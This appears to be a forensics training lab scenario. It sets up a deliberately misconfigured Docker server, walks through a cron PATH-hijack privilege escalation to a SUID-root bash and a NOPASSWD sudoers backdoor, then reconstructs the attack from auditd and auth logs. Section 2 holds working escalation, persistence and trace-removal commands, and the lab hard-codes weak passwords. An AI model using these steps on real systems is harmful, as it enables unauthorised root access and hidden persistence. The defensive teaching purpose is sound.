# Scenario 4 — Linux Privilege Escalation

> **Story.** A junior developer's account on a shared dev server was
> phished. The attacker landed as the unprivileged `dev` user and,
> within three minutes, had a root shell. The system has auditd running
> and the analyst was paged when the auth log showed an unexpected
> `sudo -i` from a service account. **Reconstruct the escalation
> path.**

**Modules used.** `linux-forensics` (auditd-tools, log-parsers).

**Estimated demo time.** 30 minutes.

---

## 1. Lab setup

`docs/scenarios/labs/04-privesc/`:

```
├── docker-compose.lab.yml
├── target/
│   ├── Dockerfile
│   ├── audit-rules.conf
│   └── entrypoint.sh
└── reset.sh
```

The "vulnerability" is a classic SUID-via-`find`-in-cron mistake: a
root cron job runs `find` with `-exec`, and the binary path can be
hijacked because the cron's `PATH` is writable by the `dev` group.
This is intentionally a 90s-style misconfig because it's perfect for
demonstrating **how the audit log catches it**.

### 1.1 Target Dockerfile

```dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y --no-install-recommends \
        sudo cron auditd audispd-plugins \
        bash-completion vim less curl \
        openssh-server \
 && rm -rf /var/lib/apt/lists/*

# Users
RUN useradd -m -s /bin/bash dev \
 && echo 'dev:devpass' | chpasswd \
 && useradd -m -s /bin/bash dba \
 && echo 'dba:dbapass' | chpasswd \
 && adduser dev sudo-readonly 2>/dev/null || true

# The misconfig: a writable PATH dir referenced by root's cron
RUN mkdir -p /opt/scripts \
 && chown root:dev /opt/scripts \
 && chmod 0775 /opt/scripts

# Root cron — runs every minute, uses /opt/scripts in PATH
RUN echo 'PATH=/opt/scripts:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' \
        > /etc/cron.d/maintenance \
 && echo '* * * * * root cleanup-temp 2>/dev/null' \
        >> /etc/cron.d/maintenance \
 && chmod 0644 /etc/cron.d/maintenance

# A legitimate cleanup-temp lives in /usr/local/bin
RUN printf '#!/bin/sh\nfind /tmp -type f -mtime +7 -delete\n' \
        > /usr/local/bin/cleanup-temp \
 && chmod 0755 /usr/local/bin/cleanup-temp

# Auditd rules
COPY audit-rules.conf /etc/audit/rules.d/forensics.rules

# Entrypoint
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
EXPOSE 22
CMD ["/entrypoint.sh"]
```

### 1.2 Audit rules (`audit-rules.conf`)

```
# Watch privilege-escalation paths
-w /etc/passwd          -p wa -k user_changes
-w /etc/shadow          -p wa -k user_changes
-w /etc/sudoers         -p wa -k privilege_changes
-w /etc/sudoers.d/      -p wa -k privilege_changes

# Watch the writable PATH dir
-w /opt/scripts/        -p wa -k pathhijack

# All execve under non-root
-a always,exit -F arch=b64 -S execve -F uid!=0 -k user_exec
-a always,exit -F arch=b32 -S execve -F uid!=0 -k user_exec

# All sudo + su use
-w /usr/bin/sudo        -p x  -k privilege_use
-w /usr/bin/su          -p x  -k privilege_use

# setuid changes
-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat \
   -F a1&06000 -k suid_change
-a always,exit -F arch=b64 -S setuid -S setgid -k privilege_set
```

### 1.3 Entrypoint

```bash
#!/usr/bin/env bash
set -e

# Generate SSH host keys
ssh-keygen -A

# Start auditd (best-effort; needs CAP_AUDIT_WRITE)
service auditd start || \
    auditd -f &       # foreground fallback if SysV failed

# Start cron
service cron start

# Start sshd
exec /usr/sbin/sshd -D -e
```

### 1.4 Compose

```yaml
services:
  target:
    build: ./target
    container_name: target-server
    hostname: dev-server-01
    networks:
      forensics-net:
        ipv4_address: 172.30.0.70
    cap_add:
      - AUDIT_WRITE
      - AUDIT_CONTROL
      - SYS_PTRACE
    ports:
      - "127.0.0.1:2222:22"
    volumes:
      - target-audit:/var/log/audit
      - target-home:/home
      - target-cron:/var/log

networks:
  forensics-net:
    name: forensics-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24

volumes:
  target-audit:
  target-home:
  target-cron:
```

### 1.5 Bring it up

```bash
cd docs/scenarios/labs/04-privesc
docker compose -f docker-compose.lab.yml up -d --build

# Wait for cron + auditd
sleep 5

# Confirm SSH works
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p 2222 dev@127.0.0.1
# password: devpass
```

---

## 2. The attack

You're now logged in as `dev` over SSH.

### 2.1 Recon

```bash
id
groups
# → dev is in groups: dev (the unix group)

# What's writable?
find / -writable -type d 2>/dev/null | grep -v '^/proc\|^/sys' | head
# → /opt/scripts among others

# What runs from cron as root?
ls -la /etc/cron.d/
cat /etc/cron.d/maintenance
# → "PATH=/opt/scripts:..." with root cron line "cleanup-temp"
```

The misconfig jumps out: `cleanup-temp` will be searched in
`/opt/scripts` *first*. We can write there.

### 2.2 Confirm the PATH-hijack vector

```bash
# Where does the legitimate cleanup-temp live?
which cleanup-temp        # in dev's $PATH (without /opt/scripts)
# → /usr/local/bin/cleanup-temp

# But cron will look in /opt/scripts first because of its PATH=
ls -la /opt/scripts
# → empty, owned by root:dev, mode 0775 (group-writable)
```

### 2.3 Plant the malicious cleanup-temp

```bash
cat > /opt/scripts/cleanup-temp <<'EOF'
#!/bin/bash
# Legit-looking but malicious
find /tmp -type f -mtime +7 -delete 2>/dev/null

# Privilege escalation: copy /bin/bash and SUID it
cp /bin/bash /tmp/.system-update
chmod 4755 /tmp/.system-update
EOF
chmod +x /opt/scripts/cleanup-temp
```

### 2.4 Wait for cron (max 60 s)

```bash
# Wait until /tmp/.system-update appears
while [[ ! -f /tmp/.system-update ]]; do
    sleep 5
done
ls -la /tmp/.system-update
# → -rwsr-xr-x 1 root root ... /tmp/.system-update
```

### 2.5 Use the SUID bash to elevate

```bash
/tmp/.system-update -p
# → bash-5.1#  (real uid 1000, effective uid 0)

# Confirm
id
# → uid=1000(dev) gid=1000(dev) euid=0(root) groups=1000(dev)

# Make it sticky — add a real backdoor in sudoers
echo 'dba ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/dba-emergency
chmod 0440 /etc/sudoers.d/dba-emergency
exit
```

### 2.6 Use the dba backdoor (a different user — looks weirder in logs)

```bash
ssh -p 2222 dba@127.0.0.1
# password: dbapass

sudo -i
# → no password prompt (the line we just added)
whoami
# → root

# Cleanup the obvious traces (but auditd already saw it)
rm /tmp/.system-update
rm /opt/scripts/cleanup-temp
```

The attacker is now persistently root via `dba` with sudo NOPASSWD,
and the dev account no longer holds any obvious artefact.

---

## 3. The investigation

### 3.1 Acquire artefacts

```bash
mkdir -p forensics-professional/evidence/case-04-privesc/{audit,auth,cron,bash}

# Audit log
docker cp target-server:/var/log/audit \
    forensics-professional/evidence/case-04-privesc/audit
# `auth.log` lives in /var/log/auth.log
docker cp target-server:/var/log/auth.log \
    forensics-professional/evidence/case-04-privesc/auth/

# Cron-related
docker cp target-server:/etc/cron.d \
    forensics-professional/evidence/case-04-privesc/cron/
docker cp target-server:/var/log/cron.log \
    forensics-professional/evidence/case-04-privesc/cron/ 2>/dev/null || true

# Sudoers
docker cp target-server:/etc/sudoers.d \
    forensics-professional/evidence/case-04-privesc/auth/

# Bash histories (best-effort; the attacker may have unset HISTFILE)
docker cp target-server:/home/dev/.bash_history \
    forensics-professional/evidence/case-04-privesc/bash/dev.bash_history 2>/dev/null
docker cp target-server:/home/dba/.bash_history \
    forensics-professional/evidence/case-04-privesc/bash/dba.bash_history 2>/dev/null
docker cp target-server:/root/.bash_history \
    forensics-professional/evidence/case-04-privesc/bash/root.bash_history 2>/dev/null

# Hash for chain of custody
cd forensics-professional/evidence/case-04-privesc
find . -type f -exec sha256sum {} \; > ../case-04-privesc.sha256
```

### 3.2 Inside the analyst container

```bash
cd forensics-professional
docker compose exec forensics bash
```

```bash
forensics-modules install linux-forensics --only auditd-tools,log-parsers -y
forensics-modules verify

mkdir -p /cases/case-04 && cd /cases/case-04

python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("case_opened", {
    "case_id": "INC-2026-004",
    "summary": "Suspected privilege escalation on dev-server-01",
    "evidence": "/evidence/case-04-privesc/",
}, user="sherlock")
PY
```

### 3.3 The auth log first — what triggered the alert?

```bash
AUTH=/evidence/case-04-privesc/auth/auth.log
grep -E 'sudo|su|session' "$AUTH" | tail -30
```

Specifically the `sudo -i` from `dba`:

```bash
grep 'dba.*sudo' "$AUTH"
# → "dba : TTY=pts/1 ; PWD=/home/dba ; USER=root ; COMMAND=/bin/bash"
```

A service account (`dba`) running `sudo -i` is unusual. Worth flagging.

### 3.4 Did anything change in sudoers?

```bash
ls -la /evidence/case-04-privesc/auth/sudoers.d/
cat /evidence/case-04-privesc/auth/sudoers.d/dba-emergency
# → "dba ALL=(ALL) NOPASSWD: ALL"
```

That file is the persistence mechanism. But the question is **how did
it get there?** `dba` couldn't write `/etc/sudoers.d/` without already
being root. So someone else became root *first*.

### 3.5 auditd to the rescue

```bash
AUDIT=/evidence/case-04-privesc/audit/audit.log

# Who wrote into /etc/sudoers.d/?
ausearch -k privilege_changes -if "$AUDIT" -i | head -40

# → SYSCALL openat from uid=0 (effective) to /etc/sudoers.d/dba-emergency
#   But auid=1000 (dev) — auditd's "audit user id" is sticky at login!
```

The **`auid` (audit UID)** is the killer field. Linux preserves the
*original* logged-in UID across `sudo`/`su`, so even when EUID becomes
0, the audit trail keeps the analyst's true identity. `auid=1000`
means "the user who originally logged in as dev did this, even after
escalation."

### 3.6 What ran from /opt/scripts?

```bash
ausearch -k pathhijack -if "$AUDIT" -i | head
# → CWD=/opt/scripts, PATH=/opt/scripts/cleanup-temp
#   uid=0 (cron ran it as root) but the *file write* came from auid=1000
```

### 3.7 Was a SUID binary created?

```bash
ausearch -k suid_change -if "$AUDIT" -i | head -20
# → chmod 04755 /tmp/.system-update by uid=0 (cron job)
```

### 3.8 Reconstruct the timeline

```bash
ausearch -ts today -k pathhijack,suid_change,privilege_changes,privilege_use \
         -if "$AUDIT" -i | aureport -i -tm | head
```

Use `aureport` for a quick summary:

```bash
aureport -if "$AUDIT" -k --summary
aureport -if "$AUDIT" -au --summary
```

### 3.9 Inspect the bash histories

```bash
cat /evidence/case-04-privesc/bash/dev.bash_history 2>/dev/null
# Often contains the literal commands the attacker typed:
#   find / -writable …
#   ls -la /opt/scripts
#   cat > /opt/scripts/cleanup-temp <<'EOF' …
```

This is the smoking-gun evidence. Attackers often forget to clear
history or the `unset HISTFILE` runs *after* their first commands are
recorded.

### 3.10 The final causal chain

| # | Time   | Actor      | Action                                                    | auid | Source |
|---|--------|------------|-----------------------------------------------------------|------|--------|
| 1 | 09:01  | dev (SSH)  | Logged in over SSH                                        | 1000 | auth.log |
| 2 | 09:02  | dev        | `find / -writable …` (recon)                              | 1000 | dev .bash_history |
| 3 | 09:04  | dev        | wrote `/opt/scripts/cleanup-temp` (malicious)             | 1000 | auditd k=pathhijack |
| 4 | 09:05  | root (cron)| executed `cleanup-temp` from /opt/scripts                 | 1000 | auditd k=user_exec |
| 5 | 09:05  | root       | created `/tmp/.system-update` SUID-root                   | 1000 | auditd k=suid_change |
| 6 | 09:06  | dev        | ran `/tmp/.system-update -p` → effective root             | 1000 | auditd execve |
| 7 | 09:06  | "root"     | wrote `/etc/sudoers.d/dba-emergency`                      | 1000 | auditd k=privilege_changes |
| 8 | 09:07  | dba        | logged in over SSH                                        | 1001 | auth.log |
| 9 | 09:07  | dba        | `sudo -i` (no password — newly added rule)                | 1001 | auth.log + auditd k=privilege_use |

Note rows 4–7 all have `auid=1000` (dev) even when the effective UID
is 0 — that's how we attribute the privilege escalation despite the
attacker pivoting users at the end.

### 3.11 Save the timeline as a report

```bash
mkdir -p /reports/INC-2026-004
cat > /reports/INC-2026-004/timeline.md <<'EOF'
# INC-2026-004 — Privilege escalation timeline

## Attack chain
1. Reconnaissance — found writable /opt/scripts referenced by root cron.
2. PATH hijack — planted /opt/scripts/cleanup-temp.
3. Cron executed the planted script as root.
4. Script created SUID copy of bash at /tmp/.system-update.
5. Attacker ran the SUID bash to obtain a root shell.
6. Persistence — added /etc/sudoers.d/dba-emergency granting NOPASSWD to dba.
7. Pivot — logged in as dba and used the new sudo rule.

## Root cause
/opt/scripts was group-writable and on root cron's PATH. Either:
- Make /opt/scripts root-owned and 0755, OR
- Use absolute paths in cron (PATH= not the issue then).

## Forensic attribution
auditd's auid field preserved dev's identity (uid 1000) across the
escalation. Even when the attacker pivoted to dba and obtained a
"clean" sudo path, the *original* user that wrote the malicious script
is recorded permanently.
EOF
```

### 3.12 IoCs and audit trail

```bash
python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("technique_identified", {
    "case_id": "INC-2026-004",
    "framework": "MITRE ATT&CK",
    "id": "T1574.007",
    "name": "Hijack Execution Flow: Path Interception by PATH Environment Variable",
})
log_event("technique_identified", {
    "case_id": "INC-2026-004",
    "framework": "MITRE ATT&CK",
    "id": "T1548.001",
    "name": "Abuse Elevation Control Mechanism: setuid",
})
log_event("ioc_identified", {
    "case_id": "INC-2026-004",
    "ioc_type": "filename",
    "value": "/tmp/.system-update",
    "label": "SUID-root bash copy",
})
log_event("attribution", {
    "case_id": "INC-2026-004",
    "subject": "auid=1000 (dev account)",
    "evidence": "auditd k=pathhijack and k=privilege_changes both bear auid=1000",
})
PY

forensics-audit verify
forensics-audit export \
    --output /reports/INC-2026-004/audit-trail.jsonl --format jsonl
```

---

## 4. What to demo

1. **The `auid` field as Rosetta stone.** Pause on the audit-log
   entries that have `uid=0` but `auid=1000`. That single field is
   what makes attribution possible after privilege escalation.
2. **Multi-source corroboration.** auth.log alone shows "dba ran sudo,
   nothing weird." Add cron + auditd and the *causality* of the
   sudoers-rule write becomes visible.
3. **Bash history is unreliable.** Show that `unset HISTFILE` would
   have hidden step 2 of the timeline. auditd would still have it.
4. **The audit chain attributes the analysis itself.** The session
   that produced the timeline is recorded too — every grep, every
   ausearch is in `forensics-audit show`.

---

## 5. Cleanup

```bash
cd docs/scenarios/labs/04-privesc
docker compose -f docker-compose.lab.yml down -v
rm -rf forensics-professional/evidence/case-04-privesc
```

---

## 6. Extension exercises

- **LinPEAS run.** Run `linpeas.sh` as `dev` *before* the attack. Note
  every weakness it flags. Did it call out `/opt/scripts`?
- **Sigma rule.** Write a Sigma rule that flags any file write under
  `/etc/sudoers.d/` from non-root auid. Convert to auditd format with
  `sigma convert -t auditd ...`.
- **Hardening.** Modify the lab to remove the misconfig (chmod 0755 on
  /opt/scripts, root:root). Re-run the attack and observe failure.
